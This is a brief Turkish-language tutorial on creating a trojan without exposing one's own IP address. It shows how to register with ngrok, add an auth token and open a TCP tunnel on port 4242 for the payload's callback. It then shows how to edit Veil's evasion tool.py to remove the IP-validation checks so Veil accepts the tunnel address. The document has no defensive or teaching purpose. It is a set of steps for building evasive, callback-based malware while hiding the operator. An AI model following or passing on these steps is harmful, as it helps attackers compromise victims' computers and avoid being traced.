# Kendi IP Adresimizi Kullanmadan Trojan Oluşturma

#### 1. ```ngrok.com``` sitesine gidiyoruz, üye oluyoruz ve profilimizde bize ait olan token'ı kopyalıyoruz
#### 2. Terminale giriyoruz ve ```.ngrok config add-authtoken 2BA7...Xoh``` çalıştırıyoruz 
#### 3. ```./ngrok``` çalıştırarak ngrok'u açıyoruz ```./ngrok help``` ile menüyü açabiliriz
#### 4. ```./ngrok tcp 4242``` çalıştırarak 4242 portunda tünel servisini açıyoruz
#### 5. ```forwarding``` kısmındaki ```IP``` ve ```PORT```'u kaydediyoruz
---

# Ngrok IP'si Kullanarak Veil'dan Trojan Oluştururken Hata Verirse

#### ```/opt/veil/tools/evasion/tool.py``` içindeki kodda ```!Error!You did not provide a valid IP``` kodunu siliyoruz(421-424.satır)
#### ```selected_payload__ ``` kısmını if ile alt alta getirip ```if helpes validate_ip(value)``` kodunu siliyoruz
